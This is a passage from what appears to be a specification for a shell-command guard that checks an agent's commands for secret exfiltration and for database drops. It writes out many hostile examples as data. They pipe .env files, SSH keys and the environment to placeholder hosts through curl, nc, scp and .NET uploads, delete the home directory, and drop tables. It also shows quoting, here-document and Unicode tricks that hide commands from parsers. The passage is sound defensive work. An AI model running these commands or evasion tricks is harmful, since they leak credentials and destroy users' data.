  history (`.bash_history`, `.zsh_history`, `fish_history`, PowerShell's
  `ConsoleHost_history.txt`, `.python_history`, `.psql_history` and the like),
  which holds every secret typed on a command line. A pattern that can name an
  `.env` or `.envrc` file (`.env*`, `.e*`, `.*`) counts when the shell
  expands it, as a word of its own: `-T .env*`, `scp .env* host:`. Part of a
  longer word is not expanded: the shell matches the whole word `@.env*`, which
  names no file, and `curl` reads that name as written, so `curl -d @.env*` is
  not a secret sent. This is the shell rule's own check: core's table does not
  hold it, since that would make `rm .env` a `delete` in the workspace.
  A name written out under a folder only known when it runs is read by the
  name: `curl -T "$x/.env"`, `cat "$x/.env" | curl -d @- …`, and `$PWD/.env`
  after a `cd` that leaves `$PWD` not plain (`cd -P sub`, `cd "$x"`, `cd d*`)
  send `.env` from wherever the folder is. The folder may be the home
  directory, so a name that core marks as a secret there is one:
  `curl -T "$x/.ssh/id_rsa"` sends `~/.ssh/id_rsa`.
- The whole environment: `env`, `printenv`, `set`, `export -p`, `declare -x`,
  `/proc/self/environ`, PowerShell's `Get-ChildItem env:` (`gci`, `dir`), a
  wildcard there that may match many (`Get-ChildItem env:AWS*`), and .NET's
  `[Environment]::GetEnvironmentVariables()`, or `GetEnvironmentVariable`
  given a name only known when it runs. One variable (`printenv HOME`,
  `Get-ChildItem env:PATH`, `[Environment]::GetEnvironmentVariable('PATH')`)
  is not. cmd's bare `set` is not read by its grammar and comes back
  `unreadable`.
- The GPG secret keys `gpg --export-secret-keys` and `--export-secret-subkeys`
  print, which no path names.
- A file the line writes from a secret, for the rest of the line: a copy
  (`cp`, `mv`, `install`, `ditto`, `ln` and `ln -s`, `dd if= of=`, an `rsync`
  to a place on this machine; a copy into a folder lands under its own name
  there), an archive `tar` or `zip` packs it into (`zip x .env` writes
  `x.zip`), a redirect of what a command that reads it prints (`cat .env >
  a`, `sort < a > b`, `env > e.txt`), and what `tee` is handed. `env > e.txt;
  curl -d @e.txt …` and `cp .env /tmp/x && curl -d @/tmp/x …` send it. A file
  is told by where it lands, as the rule about writing then running tells it.
  The copies are a graph built once and walked from the secrets, so a copy of
  a copy is followed to any depth in one walk. A write that goes through what
  a command prints into a variable (`k=$(cat a); echo "$k" > b`) needs the
  line followed again once `a` is known to hold a secret: it is, at most four
  times, and a line that still writes a new such file then is `unreadable`,
  since what it sends is not known.

**What reads one.** A program given the secret's path, its input, or a file
redirected onto it, as `read_secret` reads them, with `tar`'s operands joined to
the folder `-C` (`--directory`) moves it to (`tar czf - -C ~ .ssh` packs
`~/.ssh`). A program that prints only a name, a listing, a count or a hash
(`echo`, `printf`, `ls`, `basename`, `dirname`, `realpath`, `stat`, `du`,
`file`, `wc`, `sha256sum` and the other hashes) reads no secret: `echo .env |
nc host 1`, `ls ~/.ssh | nc host 1` and `sha256sum .env | nc host 1` send none.
Under `xargs` it prints what its input holds (`xargs echo < .env`, `xargs -a
.env echo`), and a list of names it reads from a file is printed (`file -f
.env`, `wc --files0-from=.env`): those read the file. A program `xargs` runs
is handed the names such a stage lists (`ls ~/.ssh | xargs cat | nc host 1`
is sent). The code an interpreter is given is no file name: the value of the
options that carry code for that interpreter (`node -p 'process.env'`,
`python3 -c …`, `perl -lne …`, `php -r …`), alone or ending a bundle, and
not after an option that takes a value of its own (`php -d e .env` and
`python3 -Wignore .env` run `.env`; PHP prints a file with no `<?php` tag as
it is). `tar` (creating) and `zip` read their members, not their exclude
patterns; packing the workspace or a folder that holds it onto the output
(`tar czf - .`, `zip -r - .`) reads the workspace, which may hold an `.env`
file, unless its excludes leave every secret name out (see below). `tar -C
dist .` packs `dist`.

**What sends.**

- **An upload that names the file**: `curl -d @f` (also `--data`,
  `--data-binary`, `--json`, `--data-urlencode name@f`, `-F name=@f` and
  `name=<f`, `-T f`, `--upload-file`, `-H @f`, in a bundle such as `-sd @f`;
  curl expands a `{a,b}` list in `-T`'s name itself, unless `-g`, so `curl -T
  "{.env,README}"` sends `.env`), `wget --post-file f` and `--body-file`,
  `http`, `https` and `xh` with `field@f`, `field=@f` or `@f`, and
  `Invoke-WebRequest` and `Invoke-RestMethod -InFile f`, `Send-MailMessage
  -Attachments f` (a list), and `Start-BitsTransfer -Source f` when
  `-TransferType` is `Upload`. Its source given by position is the first
  word that is not a parameter or a parameter's value; its switches
  (`-Asynchronous`, `-Suspended` and the common ones, or an abbreviation of
  one) take no value, so in `Start-BitsTransfer -Asynchronous .env https://x/u
  -TransferType Upload` the source is `.env`. Senders that name the file in their own
  syntax: `socat`'s `FILE:`, `OPEN:`, `GOPEN:` and `READFILE:` addresses
  (when another of its addresses is a network one: `TCP:`, `UDP:`,
  `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
  `s-nail`, `mutt` and `neomutt` (`-a`, `-A`, `--attach`), `gh gist create`
  (its files, or its input with none or `-`), `az storage blob upload -f`,
  and an `sftp` batch: the files its `put`, `reput` and `mput` lines name,
  split into words with sftp's quotes and backslashes (`put ".env"`), read
  from its input (a here-string, an ANSI-C one included, a here-document,
  what an `echo` before it prints without its options, or what a `printf`
  prints with its format applied) and from a process substitution it reads
  (`-b <(echo …)`, `< <(echo …)`), unless `-b` names a file other than its
  input (`-`, `/dev/stdin`), which is not read. A `put -r` of the workspace
  sends it.
- **A .NET upload**, judged as the `Invoke-RestMethod` that posts the same:
  `Net.WebClient`'s `UploadFile` (each argument is a file it may upload),
  and `UploadData`, `UploadString` and `UploadValues`, `HttpClient`'s
  `PostAsync`, `PutAsync`, `PatchAsync` and `SendAsync`, and a socket's or a
  mail client's `Send` (each argument is a body), the `Async` and `TaskAsync`
  forms too. They are named by the method alone, since the object they are
  called on is often a variable: `(New-Object Net.WebClient).UploadFile(url,
  "$HOME\.ssh\id_rsa")` sends a key. What the call's object and arguments
  run is handed to it, as for a command's substitution
  (`$wc.UploadString(url, (Get-Content .env -Raw))`).
- **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
  a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`,
  `gsutil` and `gcloud storage` (`cp`, `mv`, `rsync`) to a `s3://` or `gs://`
  one. On POSIX there are no drives, so a one-letter host is a host:
  `scp .env h:` and `rsync -av .env h:/backup` send. A source that is a secret
  goes. So does the home directory itself, and a folder that holds it, the
  root of the disk included, which hold them (`scp -r ~ host:`, `scp -r /
  host:`). A copy of a whole folder (`scp -r`, `rsync -r` or `-a`, `rclone`,
  `aws s3 sync` or `--recursive`, `gsutil` and `gcloud storage` with `-r` or
  `rsync`) of the workspace or a folder that holds it sends the workspace,
  which may hold an `.env` file: `rsync -av . host:/backup` and `scp -r .
  host:` say so in the reason, unless the `--exclude` patterns together leave
  out every name that holds secrets: `.env`, `.env.local`, `.envrc` and
  `prod.env` (`--exclude '.env*' --exclude '*.env'`). `--exclude .env` alone
  still sends `.env.local` and `.envrc`. So does an archive of the workspace
  sent on (`tar czf - . | ssh host …`, `tar czf x.tgz . && scp x.tgz host:`),
  and a copy of it sent on (`cp -r . /tmp/w && scp -r /tmp/w host:`). A destination only known when it
  runs counts as remote for `scp` and `sftp`, and for the others when it holds
  a colon. The key a program logs in with (`ssh -i`, `scp -i`, `-o
  IdentityFile=`, `curl --key`) is not sent.
- **A pipeline.** A stage reads a secret (any program given one's path, the
  environment, or a file redirected onto it; a .NET read of a file is the
  `Get-Content` of it, `[IO.File]::ReadAllText`, `ReadAllLines`,
  `ReadAllBytes`, `ReadLines`, `OpenRead`, `OpenText` and their `Async` forms,
  named by the method whatever it is called on, so
  `[IO.File]::ReadAllText('.env') | irm …` sends `.env`) and a later stage
  sends its input:
  `nc` (`nc.openbsd`, `nc.traditional`), `ncat`, `socat`, `telnet`, `ssh`,
  `mail`, `s-nail`, `gh gist create`, `Invoke-RestMethod`,
  `Send-MailMessage` (which attaches what it is piped), `curl`
  with `-d @-` or `-T -`, `wget --post-file=-`, `http` and `xh` (unless
  `--ignore-stdin`), `openssl s_client`, `rclone rcat`, `aws s3 cp -`. A stage between them changes nothing: `cat .env | base64 | nc h
  1` is sent. A program an `xargs` or `ForEach-Object` hands its input to
  counts as a stage that reads it. The pipeline after a here-document
  (`cat .env <<EOF | nc host 1`, `cat .env <<EOF | base64 | nc host 1`) is the
  same pipeline as the command before it, however many stages it has; so is a
  here-document after a pipeline (`echo hi | cat .env - <<EOF | nc host 1`),
  whose stages come first. In cmd, `type .env | more | ssh host` is one
  pipeline of three stages, as in the other shells. A pipeline inside a stage
  of another (`(cat .env | base64) | nc host 1`, `cat .env | { base64 | nc host
  1; }`, `cat .env | bash -c "base64 | nc host 1"`, `(type .env | more) | ssh
  host`, `(gc .env | Out-String) | irm …`) runs in that stage: a secret read in
  the inner pipeline counts for that stage of the outer one, and a sender in
  the inner pipeline is handed what the earlier stages of every pipeline around
  it read. A substitution, process substitution or script in a command runs
  with that command's input, so a sender that has one is handed what the
  stages before it read: `cat .env | curl -d "$(cat)" url`, `cat .env | bash -c
  'curl -d "$(cat)" url'`. It does not look at what the substitution runs: `cat
  .env | curl -H "X: $(date)" url` is flagged too, since it pipes a secret into
  a sender.
- **A redirect.** A secret redirected onto the input of one of those
  (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), onto the shell's own
  input for the rest of the line (`exec < .env; nc host 1`, `exec 0< .env`:
  the grammar reads the `0` written against `<` as a word, and the walk
  gives it back to the redirect), or the file
  `xargs -a` (`--arg-file`) reads its arguments from (`xargs -a .env curl -d`);
  or a command's output
  redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
  opens that path: `tee /dev/tcp/…` and `dd of=/dev/tcp/…` open a real path,
  find none and send nothing. PowerShell has no `<` redirect.
- **A substitution or a variable.** A sender handed a secret in its own
  arguments: `curl -d "$(cat .env)" url`, `$(<.env)`, a here-document or
  here-string that runs one, `` `…` ``, PowerShell's `-Body (Get-Content f)`;
  and a variable set from one (`k=$(cat .env); curl -d "$k" url`, `export
  K=$(…)`, and a variable set from that, copies included: `j=$k`, `j="$k"`,
  `export j=$k`). A held variable carried by a here-string or an unquoted
  here-document is a sender's input (`nc host 1 <<< "$k"`); a quoted
  delimiter (`<<'EOF'`) expands nothing. A variable a builtin sets from a
  secret holds it too: a `for` over a substitution (`for k in $(cat .env)`),
  `read` (its names, `-a`'s array, or `REPLY`) and `mapfile` and `readarray`
  (their array, or `MAPFILE`) from what they read or are piped (`read k <
  .env`, `cat .env | while read l; do …; done`), and `printf -v k` from what
  it is handed. A `source` (`.`) of a secret file sets variables the line
  does not show, so any variable a later command reads may hold it: `source
  .env && curl -H "X: $TOKEN" …`, and a here-string or here-document that
  expands one after it (`source .env; nc host 1 <<< "$TOKEN"`). So does
  `export`, `declare`, `typeset`, `local` or `readonly` given a substitution
  that reads a secret as its words (`export $(cat .env | xargs)`), which sets
  whatever names it prints; `export k=$(cat .env)` sets `k` alone. In
  PowerShell a variable assigned from a read (`$b = Get-Content .env -Raw`,
  `$b = [IO.File]::ReadAllText(…)`) holds it, and so does one assigned from
  that (`$j = "x$b"`) and the variable of a `foreach` over it (`foreach ($l
  in Get-Content .env) { iwr "https://x/$l" }`). Its names are read as
  PowerShell reads them, in any case and without a scope (`$B`,
  `$script:b`), and a variable piped on is a stage that reads what it holds
  (`$b | irm …`). An assignment to a member or an element (`$r.Content = …`,
  `$a[0] = …`) holds it in the whole variable.

A script a shell starts, a `find -exec` and a substitution take the place in a
pipeline of the command they run for. A function or an alias the line
defines is followed at every call of it. Each body is read once for the first
secret it reads and whether it can send anything (a sender, or a redirect to
a network connection in it), and a body that calls another takes on what that
one does, through calls between bodies to any depth, each body settled once
(a body calling itself ends there). A call then reads its body's secret in
its own place on the line (`f() { cat .env; }; f | nc host 1`, `curl -d
"$(f)"`, `k=$(f)`, `nc host 1 < <(f)`), and a call of a body that sends sends
what the call is given: a secret named in its words, which the body reads as
`$1` (`f() { curl -T "$1" …; }; f .env`), a substitution or a variable that
holds one, what it is piped (`f() { nc host 1; }; cat .env | f`) and what is
redirected onto it (`f < .env`). A body that sends anything counts, so `f() {
curl https://x; }; cat .env | f` is flagged too. An alias's value is read as
a script where it is defined, as a function's body is, so every rule judges
what it runs (`alias python3='rm -rf ~'` is a `delete`): each `NAME=VALUE`
of one `alias` (after a `--`) is a body of its own. A call of an alias with
words of its own is judged as the shell runs it, the last command of the
value with the call's words after its own: `alias c='curl -T'; c .env
https://x` is `curl -T .env https://x`. Each name keeps its last four bodies;
past four, its two oldest are kept as one range of units, from the start of
the first to the end of the second, which also holds whatever the line runs
between them, so a call of the name may be judged with more than it runs and
flagged for it.

Not read, so the caller has to account for them: a secret read into a
PowerShell variable by `Set-Variable`, `New-Variable` or `-OutVariable`; a
path known only when it runs (`curl -d @$F`); a connection opened with `exec
3<>/dev/tcp/…`; an `sftp -b` batch file; `git push` of a committed `.env`;
secrets outside core's table and the names above (`/etc/shadow`, a key with
an unusual name); and a `find -exec` whose filter picks secrets by a name the
guard does not know (`-name '*.pem'`).

## Data in a database

`drop_data` is for a statement a database client is given that drops,
truncates or empties something. The guard sees files and disks, and a database
is neither: `psql -c 'DROP TABLE users'` touches no path the line names.
Reading, inserting, creating and a statement that picks its rows are safe.

**Where the statement is.** Only text on the line itself is read: an option, an
operand, a here-document or here-string fed to the client, or the text a
piped `echo`, `printf` or `Write-Output` says, and what a stage that hands on
its input passes on. A `cat` reads its input, and passes the text fed to it
on, when it has no file operand, or has `-` or `/dev/stdin` among its
operands, whatever its options (`cat - <<< 'DROP TABLE t' | psql`, `cat
schema.sql - <<EOF | psql`, `cat -s <<EOF | psql`); a `cat` of files only
ignores its input, and the files are statements the line does not show (see
below). An operand only known when it runs may be `-`, or a file. The grammar
leaves a lone `-` that is the last word before a here-document out of its
tree, so the guard puts it back.

**Statements the line does not show.** A client that runs statements the line
does not show is `drop_data`, with the reason `runs statements the line does
not show`: the file could drop anything, and the line cannot tell a seed from
a teardown. That is a client given a file of statements, by its option (`psql
-f`, `--file`; `sqlcmd -i`; `cqlsh -f`; `clickhouse-client --queries-file`;
`mongosh --file` and a `.js` operand; `sqlite3 -init`, `duckdb -init` and
`-f`; `redis-cli --eval`), by a redirect (`psql < drop.sql`, `psql < <(…)`),
or by a client command in its text (`psql`'s `\i`, `\ir`, `\include` and
`\include_relative`, `mysql`'s `source` and `\.`, `cqlsh`'s `SOURCE`, `.read`
of a file in `sqlite3` and `duckdb`, `load(…)` in `mongosh`). `-f -` and
`/dev/stdin` are its input, read as such, and the null device holds nothing
(`psql -f /dev/null`, `psql … < /dev/null`; `nul` and `$null` on Windows
only, since on POSIX `nul` is a file like any other). A client given a
statement that it runs and then exits does not read its input: `psql -c`,
`mysql -e`, `clickhouse-client -q`, `sqlcmd -Q` and `cqlsh -e`, unless `-f -`
makes its input a file of statements (`sqlcmd -q` and `mysql --init-command`
go on to read it). A process substitution is a file too (`psql -f <(echo …)`). A
file the line writes before it runs it (`echo 'DROP TABLE t' > q.sql && psql
-f q.sql`) is such a file: the guard does not follow what a file holds. A
database file in the workspace is still the agent's own, so `sqlite3 data.db
< seed.sql` is safe.

The input of a client is followed out of the line: from a stage of a pipeline
to the stage before it; from the first stage of a pipeline that runs in a
stage of another (`echo … | (cat | psql)`) to the stage before that one; and
from a command a client runs for (`sh -c psql`, a substitution) to that
command's input, with the text fed to it and the files redirected onto it
(`echo … | sh -c psql`, `sh -c psql < dump.sql`); from the body of a function
the line defines to every call of it (`f() { psql; }; f < drop.sql`, `echo …
| f`); and from the line itself to an `exec` with no program before it that
redirects the shell's input (`exec < drop.sql; psql`, `exec <<EOF`). The
programs of a stage are read for what they hand on:

- `echo`, `printf` and `Write-Output` with words say their text, as above.
- A stage that hands on its input as it is passes on what it is given, read
  the same way: a `cat` that reads its input, `tee`, and in PowerShell
  `Out-String`, `Tee-Object`, `Write-Output` with no words and `ForEach-Object
  { $_ }` (`%`). `echo 'DROP TABLE t' | cat | psql` drops the table and
  `echo 'SELECT 1' | tee log.txt | psql` is safe.
- `grep` and `sed` hand on what they are given, which is read, but leave lines
  out or change them: `printf 'DELETE FROM t\nWHERE id = 1;'` through `grep
  -v WHERE` is a `DELETE` of every row. What they hand on is not shown.
- `true`, `false`, `:`, `test`, `[`, `sleep` and `wait` print nothing.
- Anything else (a `cat` of files, `curl`, `gunzip -c`, `pg_dump`,
  `Get-Content`, cmd's `type`, a function the line defines) hands on what
  the line does not show.

What one program of a stage hands on and another says (`{ printf DR; cat; }`)
is a text that is not read as one, so it is not shown. With no command of its
own, `redis-cli` runs the commands of its input, so a file or a stage the rule
does not read is `drop_data` there; given a command (`redis-cli -x set k <
value.txt`) its input is a value.
On PowerShell a value that is piped
on says its text as `Write-Output` would: a string or a here-string
(`'DROP TABLE t' | psql`, `@'` … `'@ | psql`) is read, and anything else (a
variable, `(Get-Content q.sql)`, `$x.y`, `"a" + "b"`) says what is only known
when it runs, so it is `unknown`. In a double-quoted string or a
double-quoted here-string a backtick makes the character PowerShell gives it
(`` `n `` and `` `r `` a line break, `` `t `` a tab, `` `0 ``, `` `a ``, `` `b ``,
`` `e ``, `` `f ``, `` `v `` and `` `u{…} `` the others), so `"SELECT 1;`nDROP
TABLE t"` is two statements and `iex @"` … `"@` runs the lines that a
backtick breaks. A `` `u{…} `` that makes a character PowerShell reads as more
than a character when the text runs as code (a space that is not an ASCII one,
such as U+00A0 or U+3000, which splits words; a dash from U+2013 to U+2015; a
typographic quote from U+2018 to U+201E) leaves a script read from the string
known only when it runs, so `iex "Remove-Item`u{a0}C:\Windows`u{a0}-Recurse"`
is `unknown`. So is a script that holds such a character wherever it is read
from: `cmd /c "pwsh -c Remove-Item`u{a0}C:\Windows`u{a0}-Recurse"` hands
PowerShell only part of the string, and the guard asks about the character, not
the whole string. As a path or any other argument the string is the text it holds:
`Get-Content "~\x`u{a0}\..\.ssh\id_rsa"` reads the key.
Several arguments to `Write-Output` or `echo` are one line
each, so `Write-Output 'SELECT 1 --' 'DROP TABLE t' | psql` runs the `DROP`;
`cmd`'s `echo` joins them with a space. A stage that is a group (`{ echo 'BEGIN;';
echo 'DELETE FROM t;'; } |
psql`) is read program by program, and as the one text they say in turn
(`echo -n DR; echo -n OP TABLE t`). `printf` is decoded as `printf` reads its
format: `\n \t \\ \xHH` and the other single-character escapes, `\NNN` as one
to three octal digits with the 0 in front counting as one (`\0121` is a newline
and a `1`), and `%s`, `%b`, `%d` and `%%` filled from the arguments, the format
used again while arguments are left; any other directive or escape (and `\c`,
which shells read differently in a format) makes the text `unknown`. `%b` and
`echo -e` take `\0NNN`, and `\c` ends their output. `echo` is read as written
and as decoded, since `sh`, `zsh` and `echo -e` turn `\n` into a newline.
Where shells differ in what they decode, the text is read as each of bash, zsh
and dash prints it, and a statement any of them shows counts: dash leaves
`\xHH` as written (and decodes `\n` next to it), bash's `echo -e` and zsh's
leave `\NNN` with no 0 in front, and zsh and dash leave `\"`, `\'` and `\?` in a
format.

An unquoted here-document is read as the shell feeds it: the shell treats its
body as the inside of a double-quoted word, so a backslash before a newline
joins the lines (`DR\` then `OP TABLE t` is `DROP TABLE t`), a backslash
before `$`, a backtick or a backslash goes and leaves the character (`\\!`
is `\!`, `\$x` is `$x`), and `$$` is the shell's process id (so `SELECT $$ ;
DROP TABLE t; $$` runs the `DROP`). What is left of an unescaped `$` or
backtick is an expansion, as in a double-quoted word, so the body is a
template; a body with both an escaped and an expanding `$` or backtick is
`unknown`. `<<-` takes the tabs off each line first, except a line that goes on after a
backslash-newline: every shell keeps its tabs (`DR\` then a tab and `OP`
is `DR`, a tab and `OP`). A quoted delimiter
(`<<'EOF'`, `<<\EOF`) feeds the body as it is.

The grammar reads a `$(…)` in an unquoted body but not a backtick
substitution, which the shell runs just the same, for every reader of the
here-document (`cat <<EOF` + newline + `` `rm -rf ~/x` `` + newline + `EOF`
deletes). The guard finds them itself and reads the code of each as a script
of its own, so its commands are judged and count for `effect`. A backtick ends
at the first one no backslash escapes, whatever quotes lie between, and the
code takes one backslash off `` \` ``, `\\` and `\$` (any other backslash
stays), as every POSIX shell does. Shells differ on `\"`: bash keeps the
backslash, dash takes it off (it reads the body as the inside of double
quotes), so a code that holds one is read both ways and what either shell runs
counts (`` `echo "x\"; rm -rf /home/me; echo \"y"` `` is one echoed string
to bash and three commands to dash). With `<<-` the tabs of the lines after the
first are taken off. The plain text between a body's expansions is scanned
like the rest of it, so a backtick after a `$USER` or `$(pwd)` is code and an
escaped one (`` \`x\` ``), before or after an expansion, runs nothing and reads
as before. What cannot be read is `Unreadable`: a backtick
that never closes, code that does not parse, and a backtick inside a `${…}`
(or another part the grammar read for itself). An unquoted here-document in a
backtick substitution that holds an escaped backtick is read once the outer
substitution has taken its backslashes off, as every escaped backtick inside
backticks is (see [Values read again as code](#values-read-again-as-code)),
so the body is what the shell reads.

The body of an unquoted delimiter is joined the same way when the guard splits
the line, also one inside `"$(…)"` or a backtick in double quotes: a
backslash-newline in it is taken out before the body is read, so `$(r\` then
`m -rf …)` in it is `rm`. With `<<-` the tabs of the line that goes on stay (all
of bash, sh, dash, ksh and zsh keep them), so `\tEO\` then `\tF` is no end
line. Where shells differ is a line that took in a backslash-newline and then
is, or is near, the delimiter (`EO\` then `F`): bash, sh and zsh compare the
joined line and end the body there, dash and ksh do not. Such a line, joined or
in any piece of it (`x\` then `EOF`), makes the line `Unreadable`. A quoted
delimiter's body is copied as it is.

The shell ends a here-document only at a line that is exactly the delimiter
(for `<<-`, after leading tabs only). The grammar also ends it at a line only
near the delimiter (` EOF`, `EOF `, `EOF #…`, `EOF ;…`), so the rest would be
judged as shell commands while the program reads it as its input
(`python3 - <<'PY'` with a ` PY` line in front of `shutil.rmtree(…)`). Such a
line makes the whole line `Unreadable`, for every reader of a here-document,
also one inside `"$(…)"` or a backtick in double quotes (`git commit -m
"$(cat <<'EOF' …)"` is how an agent writes one): the quoting starts afresh
inside a substitution. A line that is the delimiter in quotes or with a
backslash (`'EOF'`) ends the body for neither the grammar nor the shell, but
is refused too, so that one rule covers every spelling. A quoted delimiter is
read through its closing quote (`<<'E;F'` is `E;F`, `<<"E O"` is `E O`), and a
parenthesis in a `${…}` is not counted as the end of the `$(…)` around it. Text
whose quotes or substitutions never close is a text a shell refuses, so the
scan that joins the lines has misread it and what follows was not joined: it is
`Unreadable`.

What a stage says is worked out once and read once for each client language,
whatever the number of clients after it, so the time grows with the line and
not with the clients times the programs. A stage that says more than 256 KB
is `unknown`, and a `printf` stops printing when the stage's share is used
up.

| Client | Statement |
| --- | --- |
| `psql` | `-c`, `--command` |
| `mysql`, `mariadb` | `-e`, `--execute`, `--init-command` |
| `sqlite3` | the operands after the file, `-cmd` |
| `duckdb` | the operands after the file, `-c`, `-s`, `-cmd` |
| `mongosh`, `mongo` | `--eval` |
| `redis-cli` | the command and its arguments |
| `clickhouse-client`, `clickhouse client` | `-q`, `--query` |
| `sqlcmd` | `-Q`, `-q` (`/Q` too on Windows) |
| `cqlsh` | `-e`, `--execute` |

Short options bundle (`psql -Atc`), a value may be attached (`-cSQL`,
`--command=SQL`), and a long option may be any unique start of one of the
client's long options, as `getopt_long` reads it: `psql --co` is `--command`,
while `--c` starts both `--command` and `--csv`, is ambiguous, and psql
refuses to run it, so it is no statement option. `mysql` reads `_` as `-`
(`--init_command`). A password option that takes its value only when it is
attached leaves the next word alone: in `mongosh` (which reads its options as
yargs does) a word that starts with `-` is never the value of any option, and
`clickhouse-client --password` takes none from one, so `mongosh -u admin -p
--eval 'db.dropDatabase()'` and `clickhouse-client --password --query 'DROP
TABLE t'` read the statement option after the password. A statement option
followed by such a word reads the word as the statement too.

**What destroys.**

- **SQL.** `DROP` (a table, database, schema, index, view, anything; also
  `ALTER TABLE … DROP`), `TRUNCATE`, `DELETE` and `UPDATE` with no `WHERE`. A
  `WHERE` that picks every row (`WHERE 1`, `WHERE true`, `WHERE 1 = 1`) is
  none. A `WHERE` belongs to its own statement: in a batch with no `;`, the
  `WHERE` of a later `SELECT`, `EXEC` or `PRINT` is not the `UPDATE`'s
  (`UPDATE t SET a = 1 SELECT 1 WHERE b = 2` updates every row).
  `DO UPDATE SET`, `FOR UPDATE`, `AFTER UPDATE`, `GRANT UPDATE` and `THEN
  DELETE` after a `WHEN [NOT] MATCHED` of a `MERGE` are parts of other
  statements, and `TRUNCATE(x)` is a function; a `THEN DELETE` anywhere else
  (`IF x THEN DELETE FROM t`, `EXCEPTION WHEN OTHERS THEN DELETE FROM t`) is
  a statement. `ON DELETE` and `ON UPDATE` are a rule, not a statement, only
  when the word after the verb is a referential action or rule word
  (`CASCADE`, `SET`, `RESTRICT`, `NO`, `TO`, `CURRENT_TIMESTAMP`, `NOW`,
  `LOCALTIME`, `LOCALTIMESTAMP`): `ON DELETE CASCADE`, `ON UPDATE SET NULL`,
  `CREATE RULE r AS ON DELETE TO t`. `SET NOCOUNT ON DELETE FROM t` is a
  statement: in a T-SQL batch with no `;` the `ON` ends a `SET`, and `DELETE
  FROM` or `UPDATE t SET` after it are the next statement. `ON COMMIT DELETE
  ROWS` empties a temporary table at the end of a transaction, and is none.
  A `DROP` that takes away no data is none: `DROP NOT NULL`, `DROP DEFAULT`,
  `DROP CONSTRAINT`, `ON COMMIT DROP`, ClickHouse's `SYSTEM DROP DNS CACHE`,
  and `DROP IDENTITY` and `DROP EXPRESSION` only after `ALTER [COLUMN]
  <name>` (the word `COLUMN` is optional and neither word is reserved, so
  `ALTER TABLE users DROP identity` drops a column called `identity`);
  `DROP COLUMN`, `DROP PARTITION` and a bare `DROP` are. `DELETE` and
  `UPDATE` inside a `WITH` or after
  `EXPLAIN ANALYZE` count. `DO $$ … $$` and `DO '…'` (any string) are read as
  the statements they hold, and PL/pgSQL's `EXECUTE` in the body (not
  `EXECUTE FUNCTION`) runs text only known when it runs, so it is `unknown`.
  Text given to something that runs it is read as SQL where it is a literal:
  `EXEC('…')` and `EXECUTE('…')`, `sp_executesql`, `sp_MSforeachtable` and
  `sp_MSforeachdb` (the literal text of every argument) in T-SQL, and
  `PREPARE s FROM '…'` in MySQL; text that is not a literal (`EXEC('DROP ' +
  @t)`, `sp_executesql @sql`, `PREPARE s FROM @q`) is `unknown`. A string
  inside a string is read up to eight levels deep, and deeper is `unknown`.
  In SQLite and DuckDB, `.restore` replaces the whole database with a file,
  so it destroys. Both shells take any start of a dot command's name for the
  command (`.sh`, `.sy` and `.syst` are `.shell` and `.system`, `.op` is
  `.open`, `.rea` is `.read`, `.res` is `.restore`), so a name counts as every
  command it starts: `.shell`, `.system`, `.open`, `.attach`, `.read`,
  `.output`, `.once`, `.import`, `.restore`, `.backup` and `.save`.
  `.backup ?DB? FILE` and `.save ?OPTIONS? FILE` replace the file they are
  given, whatever database they copy from and `-readonly` or not, so the last
  word is judged like any file: in the workspace, a temporary directory or
  memory it is safe, anywhere else it is `drop_data`. The names are the
  shortest start no other command has (`.bac`, `.sa`; `.ba` and `.b` are
  not them, and `.bail` is another command). `VACUUM INTO` and `.clone`
  refuse a file that exists and are safe.
- **Redis.** `FLUSHALL`, `FLUSHDB`, an `EVAL` whose script calls one or calls
  `DEL` or `UNLINK` and also `KEYS` or `SCAN` (the commands are the strings it
  calls, so `KEYS[1]`, the keys it is given, is not a listing), and a
  `DEL` or `UNLINK` of keys the line lists: `redis-cli --scan … | xargs
  redis-cli del`, `redis-cli del $(redis-cli keys 'x*')`. `redis-cli del k`
  deletes one key and is safe. `redis-cli --cluster call HOST:PORT COMMAND…`
  runs the command on every node, and is read as the command.
- **MongoDB.** `dropDatabase`, `dropCollection`, `drop` (as a call or a
  command key), `deleteMany` and `remove` with no filter or `{}`.
- **The tools.** `dropdb`, `dropuser`, `mysqladmin drop` and `mariadb-admin
  drop`, MariaDB's name for it. `mysqladmin` runs a
  command from any unique start of its name (`mysqladmin proc stat` works),
  so a command word of two letters or more that starts `drop`, in any case,
  is `drop`: `dro`, `dr`.

**How a statement is read.** A keyword reader over the text, with no SQL
grammar. It skips comments and string literals, splits on `;`, and reads each
client as its own dialect, with only the quoting that client has, so that what
one dialect hides is not hidden in another:

| Dialect | Quoting and comments |
| --- | --- |
| PostgreSQL (`psql`) | `$tag$ … $tag$` and `E'…'` strings, block comments that nest, backslash commands; no backtick |
| SQLite (`sqlite3`) | backtick and `[…]` identifiers, dot commands, a line that starts with `#` when no statement is pending is skipped; no `$tag$`, no `E'…'` |
| DuckDB | PostgreSQL's parser: `$tag$ … $tag$` and `E'…'` strings, dot commands, `#` lines as SQLite's; a block comment that holds `/*` is `unknown`, since it is not known whether it nests |
| SQL Server (`sqlcmd`) | `[…]` identifiers, block comments that nest |
| MySQL, MariaDB | `#` comments, backslash escapes, backticks, `/*! … */` comments that run, `--` needing a space, `\g` and `\G` ending a statement, `\!` |
| ClickHouse | `#` comments, block comments that nest, backslash escapes, backticks, `$tag$` strings, `\G` |
| CQL (`cqlsh`) | `//` comments, `$$` strings |

A construct a dialect is not known to have is not read as hiding anything, so
what it holds is read as code. Whether a backslash escapes in a string is a
server setting the line can change, so the text is read with the other rule
too, in the two dialects where the setting exists, and what any reading shows
counts: MySQL and MariaDB also with no backslash escapes
(`NO_BACKSLASH_ESCAPES`) and with them in `'…'` strings only (`ANSI_QUOTES`,
where `"a\"` is an identifier), PostgreSQL also with them in `'…'` strings
(`standard_conforming_strings` off). `mysql -e "SET
sql_mode='NO_BACKSLASH_ESCAPES'; SELECT 'a\\'; DROP TABLE t; -- '"` drops the
table, as does a `psql` text that sets `standard_conforming_strings = off`
and then has `'a\'' ; DROP TABLE t; --'`, where the string takes `\'`. The
`mysql` and `mariadb` clients send each statement as its `;` arrives, and
`psql` reading its input does the same, so in a reading where a string is never
closed the statements that end before it still run: they are judged, and only
the open tail, which no client sends as a statement, is left out. `SELECT
